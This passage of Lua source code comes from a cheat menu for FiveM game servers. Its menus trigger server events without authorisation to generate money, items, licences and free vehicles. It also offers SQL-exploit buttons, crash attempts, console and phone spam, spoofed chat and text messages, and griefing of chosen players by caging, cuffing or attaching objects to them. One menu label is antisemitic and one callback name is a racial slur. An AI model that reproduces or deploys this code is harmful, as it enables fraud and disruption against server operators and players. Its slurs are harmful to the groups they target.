					if modCount > 0 then
						if mod.meta == "modFrontWheels" or mod.meta == "modBackWheels" then
							if SwagUI.ComboBox(mod.name, LSC.WheelType, installed['wheels'], function(selectedIndex, selectedItem)
								selectedIndex = selectedIndex - 1
								installed['wheels'] = selectedIndex
								SetVehicleWheelType(Swag.Player.Vehicle, selectedIndex)
								SwagUI.SetSubTitle(mod.meta, selectedItem .. " Wheels")
							end, true) then
								if modCount > 0 then
									setMenuVisible(mod.meta, true)
								end
							end
						else
							if SwagUI.MenuButton(mod.name, mod.meta) then end
						end
					end

					if mod.meta == "modXenon" then
						if SwagUI.CheckBox(mod.name, installed['modXenon']) then
							ToggleVehicleMod(Swag.Player.Vehicle, 22, not installed['modXenon'])
							LSC.UpdateMods()
						end

						if installed['modXenon'] then
							if SwagUI.ComboBox("Xenon Color", ComboOptions.XenonColor.Words, ComboOptions.XenonColor.Selected, function(selectedIndex)	
								if ComboOptions.XenonColor.Selected ~= selectedIndex then
									ComboOptions.XenonColor.Selected = selectedIndex
								end
							end) then
								SetVehicleXenonLightsColour(Swag.Player.Vehicle, ComboOptions.XenonColor.Values[ComboOptions.XenonColor.Selected])
							end
							
						end
					end
				end
			else
				if SwagUI.Button("No vehicle found") then
				end
			end
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("lsc_performance") then
			local installed = currentMods
			if Swag.Player.IsInVehicle then
				SetVehicleModKit(Swag.Player.Vehicle, 0)
				for i, type in pairs(LSC.perfMods) do
					local modCount = GetNumVehicleMods(Swag.Player.Vehicle, type.id)
					if modCount > 0 then
						if SwagUI.Slider(type.name, VehicleUpgradeWords[modCount], installed[type.meta], function(selectedIndex)
							selectedIndex = selectedIndex - 2
							installed[type.meta] = selectedIndex
							SetVehicleMod(Swag.Player.Vehicle, type.id, selectedIndex, false)
						end, true) then end
					end
				end

				if SwagUI.CheckBox("Turbo", installed['modTurbo'], function(enabled)
					installed['modTurbo'] = enabled
					ToggleVehicleMod(Swag.Player.Vehicle, 18, enabled)
				end) then end
				
				if SwagUI.ComboBox("Engine Power", ComboOptions.EnginePower.Words, ComboOptions.EnginePower.Selected, function(selectedIndex)
					if ComboOptions.EnginePower.Selected ~= selectedIndex then
						ComboOptions.EnginePower.Selected = selectedIndex
						ModifyVehicleTopSpeed(Swag.Player.Vehicle, ComboOptions.EnginePower.Values[ComboOptions.EnginePower.Selected])
					end
				end) then 
				end

				
			else
				if SwagUI.Button("No vehicle found") then
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ServerMenu") then
			SwagUI.SetSubTitle("ServerMenu", "Triggers - " .. GetCurrentServerEndpoint())
			if SwagUI.MenuButton("Resource List", "ServerResources") then end
			if SwagUI.MenuButton("~g~ESX ~s~Boss Options", "ESXBoss") then end
			if SwagUI.MenuButton("~g~ESX ~s~Money Options", "ServerMoneyOptions") then end
			if SwagUI.MenuButton("~g~ESX ~s~Misc Options", "ESXMisc") then end
			if SwagUI.MenuButton("~g~ESX ~s~Drug Options", "ESXDrugs") then end
			if SwagUI.MenuButton("~r~VRP ~s~Options", "VRPOptions") then end
			if SwagUI.MenuButton("Misc Options", "MiscServerOptions") then end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ServerResources") then
			for i=0, #serverOptionsResources do
				if SwagUI.Button(serverOptionsResources[i]) then
				end
			end
			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened('ResourceData') then
			SwagUI.SetSubTitle('ResourceData', SelectedResource .. " > Data")
			if SwagUI.MenuButton('Event Handlers', 'ResourceCEvents') then end
			if SwagUI.MenuButton('Server Events', 'ResourceSEvents') then end
			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened('ResourceCEvents') then
			SwagUI.SetSubTitle('ResourceCEvents', SelectedResource .. " > Data > Event Handlers")
			for key, name in pairs(validResourceEvents[SelectedResource]) do
				if SwagUI.Button(name) then
					print(key)
				end
			end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened('ResourceSEvents') then
			SwagUI.SetSubTitle('ResourceSEvents', SelectedResource .. " > Data > Server Events")
			if validResourceServerEvents[SelectedResource] ~= nil then
				for name, payload in pairs(validResourceServerEvents[SelectedResource]) do
					if SwagUI.Button(name) then
						local tbl = msgpack.unpack(payload)
						local buffer = name .. "("
						for k, v in ipairs(tbl) do
							buffer = (buffer .. tostring(v) .. (k == #tbl and ")" or ", "))
						end

						if #tbl == 0 then
							buffer = (buffer .. ")")
						end
						
						print("^2" .. buffer)
					end
				end
				
			end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ESXBoss") then

			if SwagUI.Button("Mechanic") then
				TriggerEvent("esx_society:openBossMenu", "mecano", function(data, menu) setMenuVisible(currentMenu, false) end)
				
			elseif SwagUI.Button("Police") then
				TriggerEvent("esx_society:openBossMenu","police",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif SwagUI.Button("Ambulance") then
				TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif SwagUI.Button("Taxi") then
				TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif SwagUI.Button("Real Estate") then
				TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif SwagUI.Button("Gang") then
				TriggerEvent("esx_society:openBossMenu","gang",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif SwagUI.Button("Car Dealer") then
				TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu) setMenuVisible(currentMenu, false) end)
			elseif SwagUI.Button("Banker") then
				TriggerEvent("esx_society:openBossMenu","banker",function(data, menu) setMenuVisible(currentMenu, false) end)  
			end

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("ServerMoneyOptions") then

			if SwagUI.Button("~g~ESX ~s~Caution Give Back") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('esx_jobs:caution', 'give_back', result, 0, 0)
				end
			end
			
			if SwagUI.Button("~g~Automatic Money ~r~ Possible Ban") then
                automaticmoneyesx()
			end
			
			if SwagUI.CheckBox("~g~ESX Hunting~s~ reward", huntspam, function(enabled) huntspam = enabled end) then
			end
			
			if SwagUI.Button("~g~ESX ~s~Eden Garage") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("eden_garage:payhealth", {costs = -result})
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Fuel Delivery") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_fueldelivery:pay", result)
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Car Thief") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_carthief:pay", result)
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~DMV School") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_dmvschool:pay", {costs = -result})
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Dirty Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_godirtyjob:pay", result)
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Pizza Boy") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_pizza:pay", result)
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Ranger Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_ranger:pay", result)
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Garbage Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_garbagejob:pay", result)
                end
			end
			
			if SwagUI.Button("~g~ESX ~s~Car Thief (DIRTY MONEY)") then
                local result = KeyboardInput("Enter amount of dirty money", "", 100)
                if result ~= "" then
                  TriggerServerEvent("esx_carthief:pay", result)
				end
			end
			if SwagUI.Button("~g~Esx ~s~Jews") then
                for i = 0, 25 do
					TriggerServerEvent('esx_vangelico_robbery:gioielli')
					TriggerServerEvent('esx_vangelico_robbery:gioielli')
					TriggerServerEvent('esx_vangelico_robbery:gioielli1')
					TriggerServerEvent('esx_vangelico_robbery:gioielli1')
					TriggerServerEvent('lester:vendita')
					TriggerServerEvent('lester:vendita')
					TriggerServerEvent('lester:vendita')
				end
			end
			
			if SwagUI.Button("~g~Esx ~s~Money Yatch") then
                for i = 0, 25 do
                    TriggerServerEvent("esx_yacht:reward")
				end
			end
			
			if SwagUI.Button("~g~Esx ~s~Steal Laptop") then
				TriggerServerEvent('99kr-burglary:Add', "laptop", 50)
				for i = 0, 25 do
					TriggerServerEvent('99kr-burglary:selllaptop')
				end
			end
			
			if SwagUI.Button("~g~ESX ~s~TruckerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			end
			if SwagUI.Button("~g~ESX ~s~Admin Give Bank") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveBank', result)
				end
			end
			if SwagUI.Button("~g~ESX ~s~Admin Give Cash") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveCash', result)
				end
			end
			if SwagUI.Button("~g~ESX ~s~GOPostalJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			end
			if SwagUI.Button("~g~ESX ~s~BankerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			end
			if SwagUI.Button("~g~ESX ~s~Slot Machine") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			end

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("ESXMisc") then

			if SwagUI.Button("~w~Set hunger to ~g~100%") then
				TriggerEvent("esx_status:set", "hunger", 1000000)
			elseif SwagUI.Button("~w~Set thirst to ~g~100%") then
				TriggerEvent("esx_status:set", "thirst", 1000000)
			elseif SwagUI.Button("~g~ESX ~s~Player Revive ID") then
				local id = KeyboardInput("Enter Player ID", "", 1000)
				if id then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(id))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(id))
					TriggerServerEvent("paramedic:revive", GetPlayerServerId(id))
					TriggerServerEvent("ems:revive", GetPlayerServerId(id))
				end
				
			elseif SwagUI.Button("~g~ESX ~s~Community Server all") then
				for i = 0, #GetActivePlayers() do
					communityService(GetPlayerServerId(i))
				end
				
			elseif SwagUI.Button("~g~ESX ~s~Skin Changer") then
				if doesResourceExist("esx_skin") then
					TriggerCustomEvent(
						false,
						"esx_skin:openRestrictedMenu",
						function(a,b)
						end
					)
				end
			
			elseif SwagUI.Button("~g~ESX ~s~Mugging Give item") then
				local itemName = KeyboardInput("Enter item name", "", 20)
				if itemName then
					TriggerServerEvent('esx_mugging:giveItems', (itemName))
					SwagUI.SendNotification({text = "~g~Succesfully Give Item" .. itemName, type = "success"})
				else
					SwagUI.SendNotification({text = "~r~Specify Item", type = "error"})
				end
			
			elseif SwagUI.Button("~g~ESX ~s~Handcuff ID") then
				local id = KeyboardInput("Enter Player ID", "", 3)
				if id then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(id))
				end
				
			elseif SwagUI.Button("~g~ESX ~s~Uncuff ID") then
				if doesResourceExist("esx_policejob") then
					TriggerCustomEvent(false, "esx_policejob:unrestrain")
				end
			
			elseif SwagUI.Button("~g~ESX ~s~Give Just Driver licenses") then
				TriggerServerEvent("esx_dmvschool:addLicense", 'dmv')
                TriggerServerEvent("esx_dmvschool:addLicense", 'drive')
			elseif SwagUI.Button("~g~ESX ~w~Get all licenses") then
				TriggerServerEvent('esx_dmvschool:addLicense', dmv)
				TriggerServerEvent('esx_dmvschool:addLicense', drive)
				TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
				TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
				
			elseif SwagUI.Button("~g~ESX ~s~Buy a vehicle for free") then
				matacumparamasini()
			
			elseif SwagUI.Button("~g~ESX ~s~Send All Bill (shitlord)") then
				local amount = KeyboardInput("Enter Amount", "", 100000000)
				  local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
				  if amount and name then
					for i = 0, 256 do
						  TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
					end
				end
			
			elseif SwagUI.Button("~g~ESX ~s~Kashacters SQL Exploit") then
				esx_kashacters()
				
			
			elseif SwagUI.Button("~g~ESX ~s~Licenses SQL Exploit") then
				esx_license()
			
			elseif SwagUI.Button("~g~ESX ~s~GCPhone Earrape") then
				gcphoneTwitter()
				
			
			elseif SwagUI.Button("~g~ESX ~s~Phone Jobs Spam") then
				PhoneSpam()
				
			
			elseif SwagUI.Button("~g~ESX ~s~Police Alert Spam") then
				esx_outlawalert()
			
			elseif SwagUI.Button("~g~ESX ~s~Police Job Crash Attempt") then
				esx_policejob_crash()
			
			
			end

			SwagUI.Display()
			
		elseif SwagUI.IsMenuOpened("VRPOptions") then
		
			if SwagUI.Button("~r~VRP ~s~Toggle HandCuffs") then
				vRP.toggleHandcuff()
			end
		
			if SwagUI.Button("~r~VRP ~s~Clear Wanted Level") then
				vRP.applyWantedLevel(0)
			end
		
			if SwagUI.Button("~r~VRP ~s~Tuner Chip") then
				if
					doesResourceExist("tunerchip") or NertigelFunc.doesResourceExist("tunerlaptop") or
					doesResourceExist("xgc-tuner") or
					doesResourceExist("tuninglaptop")
				then
					TriggerCustomEvent(false, "xgc-tuner:openTuner")
					TriggerCustomEvent(false, "tuning:useLaptop")
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~Give Money ~ypayGarage") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result ~= "" then
					TriggerServerEvent("lscustoms:payGarage", result)
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~Trucker Job Money") then
				local TJB = KeyboardInput("Enter $ Amount:", " ", 12)
				if TJB ~= " " then
					local TJB1 = TJB / 3.8
					vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
					vRPtruckS.finishTruckingDelivery({TJB1})
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~Casino Chips") then
				local CChips = KeyboardInput("Enter Chips Amount:", " ", 12)
				if CChips ~= " " then
					vRPcasinoS = Tunnel.getInterface("vRP_casino", "vRP_casino")
					vRPcasinoS.payRouletteWinnings({CChips, 2})
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~PayCheck Abuse") then
				local v = KeyboardInput("How many times?", "", 100)
				if v ~= "" then
					for i = 0,v do
						TriggerServerEvent('paychecks:bonus')
						TriggerServerEvent('paycheck:bonus')
					end
				else
					SwagUI.SendNotification({text = "~b~Invalid amount~s~.", type = "failed"})
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~SalaryPay Abuse","You need a job!") then
				local v = KeyboardInput("How many times?", "", 100)
				if v ~= "" then
					for i = 0,v do
						TriggerServerEvent('paychecks:salary')
						TriggerServerEvent('paycheck:salary')
					end
				else
					SwagUI.SendNotification({text = "~b~Invalid amount~s~.", type = "failed"})
				end
			end
			

			if SwagUI.Button("~r~VRP ~s~Chests Money") then
				TriggerCustomEvent(true, "basic")
				TriggerCustomEvent(true, "silver")
                TriggerCustomEvent(true, "legendary")
			end
			
			
			if SwagUI.Button("~r~VRP ~s~Los Santos Customs") then
				local ScamLSC = KeyboardInput("Enter amount of money", " ", 12)
				if ScamLSC ~= " " then
					TriggerCustomEvent(true, "lscustoms:payGarage", {costs = -ScamLSC})
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~WIN Slot Machine") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result ~= "" then
					TriggerServerEvent("vrp_slotmachine:server:2",result)
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~Legacy Fuel") then
				local fshn = KeyboardInput("Enter amount of money", " ", 12)
				if fshn ~= " " then
					TriggerCustomEvent(true, "LegacyFuel:PayFuel", {costs = -fshn})
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~Get driving license") then
                TriggerServerEvent("dmv:success")
			end
			
			if SwagUI.Button("~r~VRP ~s~Bank Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result ~= "" then
					TriggerServerEvent("Banca:deposit", result)
					TriggerServerEvent("bank:deposit", result)
				end
			end
			
			if SwagUI.Button("~r~VRP ~s~Bank Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result ~= "" then
					TriggerServerEvent("bank:withdraw", result)
					TriggerServerEvent("Banca:withdraw", result)
				end
			end
			
			SwagUI.Display()
			
		elseif SwagUI.IsMenuOpened("ESXDrugs") then
		
			if SwagUI.Button("~g~Harvest Weed") then
				TriggerServerEvent("esx_drugs:startHarvestWeed")
				TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				TriggerServerEvent('esx_drugs:pickedUpCannabis')
			end
			
			if SwagUI.Button("~g~Transform Weed") then
				TriggerServerEvent("esx_drugs:startTransformWeed")
				TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				TriggerServerEvent('esx_drugs:processCannabis')
			end
			
			if SwagUI.Button("~g~Sell Weed") then
				TriggerServerEvent("esx_drugs:startSellWeed")
				TriggerServerEvent("esx_illegal_drugs:startSellWeed")
			end
			
			if SwagUI.Button("~w~Harvest ~w~Coke") then
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
			end
			
			if SwagUI.Button("~w~Transform ~w~Coke") then
                TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
				TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
				TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
				TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
			end
			
			if SwagUI.Button("~w~Sell ~w~Coke") then
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				TriggerServerEvent('esx_illegal_drugs:startSellCoke')
			end
			
			if SwagUI.Button("~b~Harvest Meth") then
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				TriggerServerEvent('MF_MobileMeth:RewardPlayers')
			end
			
			if SwagUI.Button("~b~Transform Meth") then
			TriggerServerEvent('esx_drugs:startTransformMeth')
			TriggerServerEvent('esx_drugs:startTransformMeth')
			TriggerServerEvent('esx_drugs:startTransformMeth')
			TriggerServerEvent('esx_drugs:startTransformMeth')
			TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
			TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
			TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
			TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
			end
			
			if SwagUI.Button("~b~Sell Meth") then
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				TriggerServerEvent('esx_illegal_drugs:startSellMeth')
			end
			
			if SwagUI.Button("~p~Harvest Opium") then
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
			end
			
			if SwagUI.Button("~p~Transform Opium") then
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
			end
			
			if SwagUI.Button("~p~Sell Opium") then
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				TriggerServerEvent('esx_illegal_drugs:startSellOpium')
			end
			
			if SwagUI.Button("~c~Money Wash") then
				TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
				TriggerServerEvent('esx_blanchisseur:washMoney', 100)
				TriggerServerEvent('esx_blackmoney:washMoney')
				TriggerServerEvent('esx_moneywash:withdraw', 100)
				TriggerServerEvent('laundry:washcash')
			end

			if SwagUI.Button("~r~Stop all") then
				TriggerServerEvent("esx_drugs:stopHarvestCoke")
				TriggerServerEvent("esx_drugs:stopTransformCoke")
				TriggerServerEvent("esx_drugs:stopSellCoke")
				TriggerServerEvent("esx_drugs:stopHarvestMeth")
				TriggerServerEvent("esx_drugs:stopTransformMeth")
				TriggerServerEvent("esx_drugs:stopSellMeth")
				TriggerServerEvent("esx_drugs:stopHarvestWeed")
				TriggerServerEvent("esx_drugs:stopTransformWeed")
				TriggerServerEvent("esx_drugs:stopSellWeed")
				TriggerServerEvent("esx_drugs:stopHarvestOpium")
				TriggerServerEvent("esx_drugs:stopTransformOpium")
				TriggerServerEvent("esx_drugs:stopSellOpium")
				SwagUI.SendNotification({text = "~b~Everything is now stopped.", type = "success"})
			end

			SwagUI.Display()
			
		elseif SwagUI.IsMenuOpened("MiscServerOptions") then

			if SwagUI.Button("Send Discord Message") then
				local Message = KeyboardInput("Enter message to send", "", 100)
				TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
				SwagUI.SendNotification({text = "Sent message:~n~" .. Message .. "", type = "success"})
			elseif SwagUI.Button("Send ambulance alert on waypoint") then
				local playerPed = PlayerPedId()
				if DoesBlipExist(GetFirstBlipInfoId(8)) then
					local blipIterator = GetBlipInfoIdIterator(8)
					local blip = GetFirstBlipInfoId(8, blipIterator)
					WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
					TriggerServerEvent('esx_addons_gcphone:startCall', 'ambulance', "medical attention required: unconscious citizen!", WaypointCoords)
					SwagUI.SendNotification({text = "~r~Ambulance Sent To WayPoint", type = "success"})
				else
					SwagUI.SendNotification({text = "No Waypoint Sent", type = "error"})
				end

			elseif SwagUI.Button("Spoof text message (GCPHONE)") then
				local transmitter = KeyboardInput("Enter transmitting phone number", "", 10)
				local receiver = KeyboardInput("Enter receiving phone number", "", 10)
				local message = KeyboardInput("Enter message to send", "", 100)
				if transmitter then
					if receiver then
						if message then
							TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, message, 0)
						else
							SwagUI.SendNotification({text = "~r~Specify The Message", type = "error"})
						end
					else
						SwagUI.SendNotification({text = "~r~Specify Receiving Numbers", type = "error"})
					end
				else
					SwagUI.SendNotification({text = "~r~Specify Recieving Number", type = "error"})
				end
			elseif SwagUI.Button("Spoof Chat Message") then
				local name = KeyboardInput("Enter chat sender name", "", 15)
				local message = KeyboardInput("Enter your message to send", "", 70)
				if name and message then
					TriggerServerEvent('_chat:messageEntered', name, {0, 0x99, 255}, message)
				end
				
			elseif SwagUI.Button("Spam Server Console") then
				if ESX ~= nil then
					for i = 1, 50 do
						ESX.TriggerServerCallback('SwagUI:getFuckedNigger', function(players)
						end)
					end
				end
			
			
			
			elseif SwagUI.Button("InteractSound Earrape") then
				interactSound()
				
			end
	
			

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("OnlinePlayersMenu") then
			onlinePlayerSelected = {}
			
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				onlinePlayerSelected[i] = id -- equivalent to table.insert(table, value) but faster

				if SwagUI.MenuButton(("~r~ID:%-4d ~s~%s"):format(GetPlayerServerId(id), GetPlayerName(id)), 'PlayerOptionsMenu') then
					SelectedPlayer = id
				end
			end

			local index = menus[currentMenu].currentOption

			SwagUI.Display()
		
		elseif SwagUI.IsMenuOpened("PlayerOptionsMenu") then
			SwagUI.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
			
			if SwagUI.Button("Spectate", (Swag.Player.Spectating and "~g~[SPECTATING]")) then
				CreateThreadNow(function()
					SpectatePlayer(SelectedPlayer)
				end)
			end
			
			if SwagUI.Button("Clear Ped Task") then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			end
			
			if SwagUI.MenuButton("Teleporting", "TeleportP") then end
			if SwagUI.MenuButton("Weapons", "OnlineWepMenu") then end
			if SwagUI.MenuButton("Vehicle", "OnlineVehicleMenuPlayer") then end
			if SwagUI.MenuButton("ESX", "ESXMenuPlayer") then end
			if SwagUI.MenuButton("Trolling", "OnlineTrollMenu") then end
			if SwagUI.MenuButton("Exploding", "ExplodeTroll") then end
			if SwagUI.MenuButton("Object Trolling", "objmenu") then end
			if SwagUI.MenuButton("Ped Trolling", "PedTrollMenu") then end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("objmenu") then
			
			if SwagUI.Button("Attach SoccerBall to Player") then
				local hashball = "stt_prop_stunt_soccer_ball"
				while not HasModelLoaded(GetHashKey(hashball)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hashball))
				end
				local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
				SetEntityVisible(ball, 0, 0)
				AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
			end

			if SwagUI.Button("Put Player In Dark Place") then
				TubePlayer(SelectedPlayer)
			end

			if SwagUI.Button("Cage Player") then
				CageP(SelectedPlayer)
			end

			if SwagUI.Button("Jail Cage Player") then
				RealCage(SelectedPlayer)
			end
	
			if SwagUI.Button("Attach Dog Pin to Player") then
				SCage(SelectedPlayer)
			end

			if SwagUI.Button("Attach Cargo Plane House to Player") then
				local DH, mB_aymfrCFCt, cbmIa0ckQo = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				local Doghouse =
					CreateObject(GetHashKey("cargoplane"), DH, mB_aymfrCFCt, cbmIa0ckQo, true, true, false)
				SetEntityHeading(Doghouse, 0)
				FreezeEntityPosition(Doghouse, true)
			end

			if SwagUI.Button("Attach Dog House to Player") then
				local DH, mB_aymfrCFCt, cbmIa0ckQo = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				local Doghouse =
					CreateObject(GetHashKey("prop_doghouse_01"), DH, mB_aymfrCFCt, cbmIa0ckQo, true, true, false)
				SetEntityHeading(Doghouse, 0)
				FreezeEntityPosition(Doghouse, true)
			end
			
			if SwagUI.Button("Attach Turret to Player") then
				local hamburg = "hei_prop_carrier_defense_01"
				local hamburghash = GetHashKey(hamburg)
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, 1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
			
			if SwagUI.Button("Attach Radar to Player") then
